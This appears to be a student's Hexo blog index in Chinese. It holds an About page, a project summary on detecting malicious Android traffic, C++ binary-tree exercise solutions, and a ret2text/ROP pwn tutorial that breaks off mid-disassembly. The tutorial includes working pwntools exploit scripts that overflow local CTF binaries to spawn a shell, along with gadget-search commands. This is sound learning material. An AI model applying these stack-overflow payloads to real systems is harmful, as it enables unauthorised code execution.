{"meta":{"title":"は永遠に不滅である","subtitle":"击碎你沉睡的灵魂！","description":"我们从不回头","author":"4riH04X","url":"http://example.com","root":"/"},"pages":[{"title":"404","text":"","path":"404/index.html","date":"11-02","excerpt":""},{"title":"friends","text":"# 友人帐 这些人都是巨佬，浅浅挂一下希望别骂我，，， tld 糊涂涂の博客","path":"friends/index.html","date":"11-05","excerpt":""},{"title":"About Me","text":"# 0. 论前世，不问来者 热爱学习的小菜鸡、又菜又爱玩的小菜鸡、一窍不通但一腔热血的小菜鸡...... 一句话送给此时的我和此时正在看的你： “种一棵树最好的时间是十年前，其次是现在！” # 1. 个人简介 船带网安学子一枚，手贱高考还填报了法学专业，因此笨人是 “高贵” 的网安法双学位学生。 见笑了，没学过法律的小菜鸡。 喜欢数据分析，二进制安全。另外引师傅们的自我介绍：“自学二进制漏洞，是个 pwn 究极菜鸡” 但足够热爱，足矣。又想起两句话： “有人问我，你害怕死亡吗？” “答曰：若立足年成天地之魄，死又何妨” 当坚持热爱每一天的生活，当把每分每秒塞满时，这是极其幸福的。 # 2.ID 解读 4riH04X，疯癫之意，希望能不顾牲命，H04X 即是 HOAX 疯狂、疯癫。 “即是我认定的巅峰，无顾艰辛，亦为此疯癫，纵千年无名” 希望能以此 ID 自嘲并鼓励自己不顾他人眼光，自我陶醉吧！ ~“Past lives couldn't ever hold me” ~&quot;Don't wake me, I'm not dreamin'&quot; # 3. 未来展望 借此博客的开辟，记录一下自己的学习体会和个人对一些知识浅薄的理解。 更多的希望自己借此博客激励自己， “仰天大笑出门去，我辈岂是蓬蒿人！”","path":"about/index.html","date":"11-02","excerpt":""},{"title":"links","text":"# 0. 说明 这里存放了一些实用的网站！！！持续更新，可以给我留言","path":"links/index.html","date":"11-05","excerpt":""},{"title":"categories","text":"","path":"categories/index.html","date":"11-02","excerpt":""},{"title":"search","text":"","path":"search/index.html","date":"11-02","excerpt":""}],"posts":[{"title":"2023大创介绍","text":"&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; ...... # 项目简介 ​ 网络犯罪随技术发展而日益泛滥，现有的侦查取证技术却无法满足司法实务需要，让不法分子有可乘之机，严重威胁了个人信息、公民财产乃至国家安全。项目基于前期调研，研究 Android 流量分析技术，拟用 VPN 代理采集流量，集成强化学习模型与 LLMs，基于 LSTM 与 LightGBM 等模型实现本地轻量化；实现应用恶意行为粗识别与风险预警；服务端精检测、有效检出恶意流量并分析取证；结合诉讼法和证据法评估分析并搭建一个基于 B/S 架构的分析报告查询与经验交流网页。 # 项目创新点 1.AI 赋能 Network Traffic Analysis，集成强化学习和 LLMs 高效检出恶意流量，提升 Android、HarmonyOS 应用生态质量。 2. 借助大样本集强化特征工程，构建基于目的、时域等属性的多维特征库。 3. 数字赋能刑事取证突破网络犯罪，搭建辅助取证平台，协查并提供证据线索。","path":"Project/DaChuang/大创介绍/","date":"11-12","excerpt":"","tags":[{"name":"大创","slug":"大创","permalink":"http://example.com/tags/%E5%A4%A7%E5%88%9B/"}]},{"title":"二叉树题解","text":"# 二叉树部分题解 大二上学期，做了一些树的题放一些个人的题解，正在熟悉 C++, 闲来无事时可以翻看。嘿嘿 行高亮123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770/******************************************************************************** 1.相同的树*/#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;queue&gt;#include &lt;sstream&gt;#include &lt;limits&gt;#include &lt;cmath&gt;using namespace std;//数据结构一：常规二叉树struct TreeNode &#123; int val; TreeNode* left; TreeNode* right; TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;&#125;;// 将数组转换为层序二叉树的函数TreeNode* arrayToTree(const vector&lt;string&gt;&amp; arr) &#123; if (arr.empty()) &#123; return nullptr; &#125; // 构建根节点 TreeNode* root = new TreeNode(stoi(arr[0])); queue&lt;TreeNode*&gt; q; q.push(root); int i = 1; while (!q.empty() &amp;&amp; i &lt; arr.size()) &#123; TreeNode* current = q.front(); q.pop();//stoi是C++中的一个函数，用于将字符串转换为整数。它的完整名称是std::stoi，属于&lt;string&gt;头文件中的函数。 // 构建左子树节点 if (arr[i] != &quot;null&quot;) &#123; current-&gt;left = new TreeNode(stoi(arr[i])); q.push(current-&gt;left); &#125; i++; // 构建右子树节点 if (i &lt; arr.size() &amp;&amp; arr[i] != &quot;null&quot;) &#123; current-&gt;right = new TreeNode(stoi(arr[i])); q.push(current-&gt;right); &#125; i++; &#125; return root;&#125;// 判断两个二叉树是否相同的函数bool isSameTree(TreeNode* p, TreeNode* q) &#123; if (p == nullptr &amp;&amp; q == nullptr) &#123; return true; &#125; if (p == nullptr || q == nullptr) &#123; return false; &#125; return (p-&gt;val == q-&gt;val) &amp;&amp; isSameTree(p-&gt;left, q-&gt;left) &amp;&amp; isSameTree(p-&gt;right, q-&gt;right);&#125;// 释放二叉树内存的函数void deleteTree(TreeNode* root) &#123; if (root == nullptr) &#123; return; &#125; deleteTree(root-&gt;left); deleteTree(root-&gt;right); delete root;&#125;int main_1() &#123; string arrayString1; getline(cin, arrayString1);//getline可以读入空格，以换行结束/* // 找到第一个数组部分的起始位置和结束位置 size_t start1 = input.find(&#x27;[&#x27;); size_t end1 = input.find(&#x27;]&#x27;); // 提取第一个数组部分的字符串 string arrayString1 = input.substr(start1 + 1, end1 - start1 - 1); // 找到第二个数组部分的起始位置和结束位置 size_t start2 = input.find(&#x27;[&#x27;, end1 + 1); size_t end2 = input.find(&#x27;]&#x27;, start2 + 1); // 提取第二个数组部分的字符串 string arrayString2 = input.substr(start2 + 1, end2 - start2 - 1);*/ string arrayString2; getline(cin, arrayString2);//getline可以读入空格，以换行结束 // 解析输入字符串为字符串数组1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); &#125; // 解析输入字符串为字符串数组2 vector&lt;string&gt; arr2; stringstream ss2(arrayString2); string token2; while (getline(ss2, token2, &#x27;,&#x27;)) &#123; arr2.push_back(token2); &#125; if (arr1.size() != arr2.size()) &#123; cout &lt;&lt; &quot;false&quot; &lt;&lt; endl; &#125; else &#123; // 构建第一个二叉树 TreeNode* p = arrayToTree(arr1); // 构建第二个二叉树 TreeNode* q = arrayToTree(arr2); // 判断两个二叉树是否相同 bool result = isSameTree(p, q); cout &lt;&lt; boolalpha &lt;&lt; result &lt;&lt; endl; // 释放二叉树内存 deleteTree(p); deleteTree(q); &#125; return 0;&#125;/*********************************************************************************2.二叉树的中序遍历,判断它是不是镜面对称*/// 判断二叉树是否对称的辅助函数bool isSymmetricHelper(TreeNode* leftNode, TreeNode* rightNode) &#123; // 左子树和右子树都为空，对称 if (leftNode == nullptr &amp;&amp; rightNode == nullptr) &#123; return true; &#125; // 左子树或右子树有一个为空，不对称 if (leftNode == nullptr || rightNode == nullptr) &#123; return false; &#125; // 判断左子树的左子树和右子树的右子树是否对称，以及左子树的右子树和右子树的左子树是否对称 return (leftNode-&gt;val == rightNode-&gt;val) &amp;&amp; isSymmetricHelper(leftNode-&gt;left, rightNode-&gt;right) &amp;&amp; isSymmetricHelper(leftNode-&gt;right, rightNode-&gt;left);&#125;// 判断二叉树是否对称bool isSymmetric(TreeNode* root) &#123; if (root == nullptr) &#123; return true; &#125; return isSymmetricHelper(root-&gt;left, root-&gt;right);&#125;int main_2() &#123; string arrayString1; getline(cin, arrayString1);//getline可以读入空格，以换行结束 // 解析输入字符串为字符串数组1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); &#125; //构建树 TreeNode* p = arrayToTree(arr1); if (isSymmetric(p)) &#123; cout &lt;&lt; &quot;true&quot; &lt;&lt; endl; &#125; else cout &lt;&lt; &quot;false&quot; &lt;&lt; endl; return 0;&#125;/******************************************************************************3: 翻转二叉树给你一棵二叉树的根节点 root ，翻转这棵二叉树，并返回其根节点。*/// 交换二叉树的左右子树void swapLeftAndRight(TreeNode* root) &#123; if (root == nullptr) &#123; return; &#125; // 交换左右子树 TreeNode* temp = root-&gt;left; root-&gt;left = root-&gt;right; root-&gt;right = temp; // 递归交换左右子树 swapLeftAndRight(root-&gt;left); swapLeftAndRight(root-&gt;right);&#125;//现在已经知道num//算当前层数int calculateHeight(int num) &#123; int height = 0; while (pow(2, height) - 1 &lt; num) &#123; height++; &#125; return height;&#125;//满二叉树最多有几个节点int calculateNodeCount(int height) &#123; return pow(2, height) - 1;&#125;// 层序遍历二叉树void levelOrderTraversal(TreeNode* root,int num) &#123; if (root == nullptr) &#123; return; &#125; queue&lt;TreeNode*&gt; q; q.push(root); int i = 0,null=0; while (!q.empty()) &#123; i++; TreeNode* current = q.front(); q.pop(); if (current) &#123; cout &lt;&lt; current-&gt;val; if (current-&gt;left || current-&gt;right) &#123; if (current-&gt;left) &#123; q.push(current-&gt;left); &#125; else &#123; q.push(nullptr); null++; &#125; if (current-&gt;right) &#123; q.push(current-&gt;right); &#125; else &#123; q.push(nullptr); null++; &#125; &#125; else if (i &lt; num) &#123; q.push(nullptr); q.push(nullptr); null += 2; &#125; &#125; else &#123; null--; cout &lt;&lt; &quot;null&quot;; &#125; if (null == q.size()) break; if (!q.empty()) &#123; cout &lt;&lt; &quot;,&quot;; &#125; &#125;&#125;int main_3() &#123; string arrayString1; getline(cin, arrayString1);//getline可以读入空格，以换行结束 int num = 0; // 解析输入字符串为字符串数组1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); num++; &#125; int height = calculateHeight(num); int num1 = calculateNodeCount(height-1); //构建树 TreeNode* p = arrayToTree(arr1); swapLeftAndRight(p); levelOrderTraversal(p,num1); return 0;&#125;//1,2,2,3,4,4,5,5,null,5,5,4,4,3,4,null,5,4/*4: 左叶子之和题目描述给定二叉树的根节点 root ，返回所有左叶子之和。输入描述一个节点序列输出描述返回其左叶子之和*/// 加二叉树左树叶子void Addleft(TreeNode* root) &#123; if (root == nullptr) &#123; cout &lt;&lt; &quot;0&quot; &lt;&lt; endl; return; &#125; if (!(root-&gt;left || root-&gt;right)) &#123; cout &lt;&lt; &quot;0&quot; &lt;&lt; endl; return; &#125; int num = 0; int flag = 0; queue&lt;TreeNode*&gt; q; TreeNode* a = new TreeNode(-1); q.push(root); while (!q.empty()) &#123; TreeNode* current = q.front(); q.pop(); if (current-&gt; val==- 1) &#123; flag = 1; //cout &lt;&lt; flag&lt;&lt;&quot; &quot;&lt;&lt;q.front()-&gt;val &lt;&lt; endl; continue; &#125; else if (current) &#123; if (current-&gt;left || current-&gt;right) &#123; if (current-&gt;left) &#123; q.push(a);//左子树前先加个-1进去 q.push(current-&gt;left); &#125; if (current-&gt;right) &#123; q.push(current-&gt;right); &#125; flag = 0; &#125; else if (flag == 1 &amp;&amp; current &amp;&amp; !(current-&gt;left || current-&gt;right)) &#123; // cout &lt;&lt; current-&gt;val &lt;&lt; endl; num += current-&gt;val; //cout &lt;&lt; num &lt;&lt; endl; flag = 0; &#125; else; &#125; &#125; cout &lt;&lt; num &lt;&lt; endl;&#125;int main_4() &#123; string arrayString1; getline(cin, arrayString1);//getline可以读入空格，以换行结束 // 解析输入字符串为字符串数组1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); &#125; //构建树 TreeNode* p = arrayToTree(arr1); Addleft(p); return 0;&#125;/******************************************************************5.*构建最小二叉搜索树*/// 递归构建二叉搜索树//分治思想int BSTnum = 0;TreeNode* buildBST(vector&lt;string&gt; nums, int start, int end) &#123; if (start &gt; end) &#123; return NULL; &#125; else BSTnum++; int mid = 0; if (end - start % 2 == 0) &#123; mid = start + (end - start) / 2; &#125; else &#123; mid = start + (end - start+1)/ 2; &#125; //cout &lt;&lt; mid &lt;&lt; endl; TreeNode* root = new TreeNode(stoi(nums[mid])); root-&gt;left = buildBST(nums, start, mid - 1); root-&gt;right = buildBST(nums, mid + 1, end); return root;&#125;// 创建高度最小的二叉搜索树TreeNode* createMinimalBST(vector&lt;string&gt; nums) &#123; // cout &lt;&lt; nums.size() - 1 &lt;&lt; endl; return buildBST(nums, 0, nums.size()-1);&#125;int main_5() &#123; string arrayString1; getline(cin, arrayString1);//getline可以读入空格，以换行结束 // 解析输入字符串为字符串数组1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; int num = 0; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); num++; &#125; //构建树 TreeNode* p = createMinimalBST(arr1); int height = calculateHeight(BSTnum); int num1 = calculateNodeCount(height - 1); levelOrderTraversal(p,num1); return 0;&#125;/*第6题 给定完美二叉树，填充每个右指针struct Node &#123;int val;Node *left;Node *right;Node *next;&#125;填充它的每个 next 指针，让这个指针指向其下一个右侧节点。如果找不到下一个右侧节点，则将 next 指针设置为 NULL。初始状态下，所有 next 指针都被设置为 NULL。输入描述给一个完美二叉树输出描述输出填充它的每个 next 指针，让这个指针指向其下一个右侧节点。如果找不到下一个右侧节点，则将 next 指针设置为 NULL。输入输出样例输入root = [1,2,3,4,5,6,7]输出[1,#,2,3,#,4,5,6,7,#] 输入root = []输出[]*///有next的树节点struct TreeLinkNode &#123; int val; TreeLinkNode* left; TreeLinkNode* right; TreeLinkNode* next; TreeLinkNode(int x) : val(x), left(nullptr), right(nullptr), next(nullptr)&#123;&#125;&#125;;int ErCiFang(int i) &#123; int n = 2; int num = 0; while(1) &#123; num += n; n *= 2; if (num == i) &#123; return 1; &#125; else if (num &gt; i) &#123; return 0; &#125; else continue; &#125;&#125;TreeLinkNode* PerfectTree(vector&lt;string&gt;&amp; Tree) &#123; if (Tree.empty()) &#123; return nullptr; &#125; TreeLinkNode *root = new TreeLinkNode(stoi(Tree[0])); root-&gt;next = nullptr; queue&lt;TreeLinkNode*&gt; q; q.push(root); int i = 1; int ans = 0; while (1) &#123; TreeLinkNode* current = q.front(); // cout &lt;&lt; &quot;存入:&quot; &lt;&lt; current-&gt;val&lt;&lt;endl; q.pop(); ans++; //构建next指针 if (!q.empty()) &#123; TreeLinkNode* next = q.front(); if (ErCiFang(ans-1)) &#123; current-&gt;next = nullptr; // cout &lt;&lt; &quot;产生一个#&quot; &lt;&lt; endl; &#125; else &#123; // cout&lt;&lt;current-&gt;val &lt;&lt; &quot;产生一个next是&quot;; current-&gt;next = next; // cout &lt;&lt; next-&gt;val &lt;&lt; endl; &#125; &#125; // 构建左子树节点 if (i &lt; Tree.size()) &#123; current-&gt;left = new TreeLinkNode(stoi(Tree[i])); q.push(current-&gt;left); //cout &lt;&lt; &quot; mama&quot; &lt;&lt; current-&gt;val &lt;&lt; &quot;mama &quot;; &#125; i++; // 构建右子树节点 if (i &lt; Tree.size())&#123; current-&gt;right = new TreeLinkNode(stoi(Tree[i])); q.push(current-&gt;right); &#125; i++; if (q.empty()) &#123; break; &#125; &#125; return root;&#125;// next层序遍历二叉树void LevelTraversalPerfectTree(TreeLinkNode* root) &#123;//完美树不存在空树 if (root == nullptr) &#123; cout &lt;&lt; &#x27; &#x27; &lt;&lt; endl; return; &#125; queue&lt;TreeLinkNode*&gt; q; q.push(root); while (root-&gt;left) &#123;//先存入全部最左元素 q.push(root-&gt;left); root = root-&gt;left; &#125; while (!q.empty()) &#123; TreeLinkNode* current = q.front(); q.pop(); while (current) &#123; cout &lt;&lt; current-&gt;val &lt;&lt; &quot;,&quot;; current = current-&gt;next; &#125; if (!q.empty()) &#123; cout &lt;&lt; &quot;#,&quot;; &#125; else cout &lt;&lt; &quot;#&quot; &lt;&lt; endl; &#125;&#125;int main_6() &#123; string arrayString1; getline(cin, arrayString1);//getline可以读入空格，以换行结束 // 解析输入字符串为字符串数组1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); &#125; //构建完美树 TreeLinkNode* p = PerfectTree(arr1); // cout &lt;&lt; &quot;构建成功&quot; &lt;&lt; endl; LevelTraversalPerfectTree(p); return 0;&#125;/*7: 二叉树的最近公共祖先题目描述给定一个二叉树, 找到该树中两个指定节点的最近公共祖先。（一个节点也可以是它自己的祖先）。输入描述给一个二叉树输出描述输出它的最近公共近邻输入输出样例输入root = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 1输出3输入root = [1,2], p = 1, q = 2输出1*/struct ParentTreeNode &#123; int val; int ans; ParentTreeNode* left; ParentTreeNode* right; ParentTreeNode* parent; ParentTreeNode(int x, int y) : val(x), ans(y),left(nullptr), right(nullptr), parent(nullptr) &#123;&#125;&#125;;// 将数组转换为有父母的层序二叉树的函数ParentTreeNode* ParentTree(const vector&lt;string&gt;&amp; arr) &#123; if (arr.empty()) &#123; return nullptr; &#125; int ans = 1; // 构建根节点 ParentTreeNode* root = new ParentTreeNode(stoi(arr[0]),ans); root-&gt;parent = root; queue&lt;ParentTreeNode*&gt; q; q.push(root); ans++; int i = 1; while (!q.empty() &amp;&amp; i &lt; arr.size()) &#123; ParentTreeNode* current = q.front(); q.pop(); //stoi是C++中的一个函数，用于将字符串转换为整数。它的完整名称是std::stoi，属于&lt;string&gt;头文件中的函数。 // 构建左子树节点 if (arr[i] != &quot;null&quot;) &#123; current-&gt;left = new ParentTreeNode(stoi(arr[i]), ans); current-&gt;left-&gt;parent = current; q.push(current-&gt;left); ans++; &#125; //else ans++; i++; // 构建右子树节点 if (i &lt; arr.size() &amp;&amp; arr[i] != &quot;null&quot;) &#123; current-&gt;right = new ParentTreeNode(stoi(arr[i]), ans); current-&gt;right-&gt;parent = current; q.push(current-&gt;right); ans++; &#125; //else ans++; i++; &#125; return root;&#125;//层序遍历到p然后指针停在那里ParentTreeNode* Findpq(ParentTreeNode* root, int p) &#123; if (root == nullptr) &#123; return root; &#125; queue&lt;ParentTreeNode*&gt; q; q.push(root); ParentTreeNode* current = q.front(); while (!q.empty()) &#123; ParentTreeNode* current = q.front(); q.pop(); if (current-&gt;ans == p) return current; if (current-&gt;left) &#123; q.push(current-&gt;left); &#125; if (current-&gt;right) &#123; q.push(current-&gt;right); &#125; &#125; return current;&#125;void FindSameParent(ParentTreeNode* root,int p,int q)&#123; //层序遍历到p然后指针停在那里 ParentTreeNode* a = Findpq(root, p); // cout &lt;&lt; &quot;a查找成功:ans为&quot; &lt;&lt;a-&gt;ans&lt;&lt; &quot;val为&quot; &lt;&lt; a-&gt;val&lt;&lt; endl; ParentTreeNode* b = Findpq(root, q); // cout &lt;&lt; &quot;b查找成功:ans为&quot; &lt;&lt; b-&gt;ans&lt;&lt; &quot;val为&quot; &lt;&lt; b-&gt;val&lt;&lt;endl; while (1) &#123; // cout &lt;&lt; &quot;********遍历查找*********&quot;&lt;&lt; endl; if (a-&gt;parent == b-&gt;parent) &#123;//当前就已经相同 cout &lt;&lt; a-&gt;parent-&gt;val &lt;&lt; endl; break; &#125; else if (a == b-&gt;parent) &#123; cout &lt;&lt; a-&gt;val &lt;&lt; endl; break; &#125; else if (a-&gt;parent == b) &#123; cout &lt;&lt; b-&gt;val &lt;&lt; endl; break; &#125; //else if (a-&gt;parent == root || b-&gt;parent == root) &#123;//遍历到底 // cout &lt;&lt; &quot;输出了root值&quot; &lt;&lt; endl; // cout &lt;&lt; root-&gt;val &lt;&lt; endl; // break; // &#125; else if (a-&gt;parent-&gt;ans &lt; b-&gt;parent-&gt;ans) &#123; // cout &lt;&lt; &quot;b+1此时a的ans比b小,a为&quot; &lt;&lt; a-&gt;parent-&gt;ans &lt;&lt; &quot;,b为&quot; &lt;&lt; b-&gt;parent-&gt;ans &lt;&lt; endl; b = b-&gt;parent; &#125; else if (a-&gt;parent-&gt;ans &gt; b-&gt;parent-&gt;ans) &#123; // cout &lt;&lt; &quot;a+1此时b的ans比a小,a为&quot; &lt;&lt; a-&gt;parent-&gt;ans &lt;&lt; &quot;,b为&quot; &lt;&lt; b-&gt;parent-&gt;ans &lt;&lt; endl; a = a-&gt;parent; &#125; else continue; &#125;&#125;int main_7() &#123; string arrayString1; getline(cin, arrayString1);//getline可以读入空格，以换行结束 // 解析输入字符串为字符串数组1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); &#125; int p = 0, q = 0; cin &gt;&gt; p &gt;&gt; q; //构建父母树 ParentTreeNode* root = ParentTree(arr1); // cout &lt;&lt; &quot;构建成功&quot; &lt;&lt; endl; FindSameParent(root, p, q); return 0;&#125;/*第八题，给了二叉搜索树* 8: 恢复二叉搜索树题目描述给你二叉搜索树的根节点 root ，该树中的 恰好 两个节点的值被错误地交换。请在不改变其结构的情况下，恢复这棵树 。输入描述给一个二叉树输出描述恢复这棵树输入输出样例输入root = [1,3,null,null,2]输出[3,1,null,null,2]输入Root = [3,1,4,null,null,2]输出[2,1,4,null,null,3]**********提醒：* 二叉搜索树满足任意节点的左子树们恒定小于它，右边大于它* 此处只有两个节点值，因此我们最笨的想法就是固定一个节点往下遍历它的有没有不符合的，直到结束* 优化算法，，，，，待会看题解*///构造已知二叉搜索树，可以调用树生成那个函数，他给的就是层序遍历int main() &#123; string arrayString1; getline(cin, arrayString1);//getline可以读入空格，以换行结束 // 解析输入字符串为字符串数组1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); &#125; return 0;&#125;","path":"computer-science/Data-Structures/cpp/二叉树题解/","date":"11-10","excerpt":"","tags":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}]},{"title":"Pwn复习-初级ROP","text":"&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; # 一.ROP 编程介绍 ​ 随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP (Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。 ​ 之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件： 1. 程序存在溢出，并且可以控制返回地址。 2. 可以找到满足条件的 gadgets 以及相应 gadgets 的地址。 3. 如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。 # 二.ret2text # 1. 原理 ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。 这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。 注： ret2text 即控制返回地址指向程序本身已有的的代码 (.text) 并执行 # 2.x64 和 x86 函数调用方式不同导致 ret2text 布栈不同 # 2.1 函数调用约定 _cdecl: c/c++ 默认方式，参数从右向左入栈，主调函数负责栈平衡。 _stdcall: Windows API 方式，参数从右向左入栈，被调函数负责栈平衡。 _fastcall: 快速调用方式。即将参数优先从寄存器传入（ecx 和 edx），剩下的参数从右向左入栈。由于栈位于内存区域，而寄存器位于 cpu 内，存取快于内存。 这里讲述默认的 gcc 调用约定_cdecl 的一些特点。 &lt;img src=&quot;https://gitee.com/murry_ari/murray/raw/master/images/image-20231108213808856.png&quot; alt=&quot;image-20231108213808856&quot; style=&quot;zoom:67%;&quot; /&gt; x86 使用栈传递参数 使用 eax 存放返回值 x64 前六个参数依次存放于 rdi，rsi，rdx，rcx，r8，r9 中 多余的参数存放于栈中 # 3. 解法举例 # 3.1x86 题解方法 对于函数传参的函数，其栈格式为： &lt;img src=&quot;https://gitee.com/murry_ari/murray/raw/master/images/image-20231108110345769.png&quot; alt=&quot;image-20231108110345769&quot; style=&quot;zoom:50%;&quot; /&gt; 故而我们需要利用溢出覆盖返回地址进入 func 函数内部，再将参数一指向 “/bin/sh” 的储存地址即可。其中要注意的是 r 处需要我们进行垃圾数据的填充。 现在利用 gdb 查找 func 函数地址和 sh 存放地址（具体偏移量由 ida 查看不再详细讲解） 注意这种 x86 是要进入 func 函数，然后把参数一覆盖成 bin/sh, 因此有三个参数，payload = padding*b'a' + p32 (ret_addr) + p32 (0) + p32 (sh_addr) 书写 payload： 行高亮12345678910111213141516171819202122232425`from pwn import * context(log_level=&#x27;debug&#x27;,arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;) file = &#x27;./ret2text_func2_x86&#x27; io = process(file)elf = ELF(file)rop = ROP(file) sh_addr = 0x804c018ret_addr = elf.symbols[&#x27;func&#x27;]padding = 0x14 payload = padding*b&#x27;a&#x27; + p32(ret_addr) + p32(0) + p32(sh_addr) dem = b&#x27;inputs:&#x27;io.sendlineafter(dem,payload)io.interactive()` 成功 # 3.2x64 解题方法 对 x64 的参数，大部分情况下，前六个参数储存在寄存器内，无法直接使用简单的栈溢出修改寄存器内容，这时候我们需要解除 ROPgadget 工具进行辅助。 ROP (Return Oriented Programming)，即返回导向编程，通过栈溢出内容覆盖返回地址，使其跳转到可执行文件中已有的片段代码中执行我们选择的代码段。 知道了 ROP 工具的功能，我们需要做的是 修改 rdi 的值（可使用代码 pop rdi ; ret） 在栈中放入‘bin/sh’经由 pop 提交给 rdi 进入 func 函数内调用 system 函数 利用 gdb 查找 func 函数地址和 sh 存放地址（具体偏移量由 ida 查看不再详细讲解）： 利用 ROPgadget 查找需要的代码行 --pop rdi ; ret 行高亮1ROPgadget --binary ret2text_func2_x64 --only &#x27;pop|ret&#x27; payload = padding*b'a' + p64 (pop_rdi_ret) + p64 (sh_addr)+ p64 (ret_addr) #64 位三步走原则 构造 payload： 行高亮1234567891011121314151617181920212223242526`from pwn import *context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)#context(arch=&#x27;arm64&#x27;,os=&#x27;linux&#x27;)#打开路径file = &#x27;./ret2text_func2_x64&#x27; io = process(file) elf = ELF(file) rop = ROP(file) #调试gdb.attach(io)pause()sh_addr = 0x404028 ret_addr = elf.symbols[&#x27;func&#x27;] #这个可以自己找，也可以调用函数帮你找 pop_rdi_ret = 0x40121b #这个用gadget就行 padding = 0x10payload = padding*b&#x27;a&#x27; + p64(pop_rdi_ret) + p64(sh_addr)+ p64(ret_addr) #64位三步走原则 dem = b&#x27;inputs:&#x27; io.sendlineafter(dem,payload) io.interactive()` 运行成功 pwn 掉 # 3.3x86 举例 其实，在栈溢出的基本原理中，我们已经介绍了这一简单的攻击。在这里，我们再给出另外一个例子，bamboofox 中介绍 ROP 时使用的 ret2text 的例子。 首先，查看一下程序的保护机制 行高亮123456➜ ret2text checksec ret2text Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 可以看出程序是 32 位程序，其仅仅开启了栈不可执行保护。然后，我们使用 IDA 来查看源代码。 行高亮1234567891011int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(&quot;There is something amazing here, do you know anything?&quot;); gets((char *)&amp;v4); printf(&quot;Maybe I will tell you next time !&quot;); return 0;&#125; 可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞。此后又发现 行高亮1234567891011121314151617181920212223.text:080485FD secure proc near.text:080485FD.text:080485FD input = dword ptr -10h.text:080485FD secretcode = dword ptr -0Ch.text:080485FD.text:080485FD push ebp.text:080485FE mov ebp, esp.text:08048600 sub esp, 28h.text:08048603 mov dword ptr [esp], 0 ; timer.text:0804860A call _time.text:0804860F mov [esp], eax ; seed.text:08048612 call _srand.text:08048617 call _rand.text:0804861C mov [ebp+secretcode], eax.text:0804861F lea eax, [ebp+input].text:08048622 mov [esp+4], eax.text:08048626 mov dword ptr [esp], offset unk_8048760.text:0804862D call ___isoc99_scanf.text:08048632 mov eax, [ebp+input].text:08048635 cmp eax, 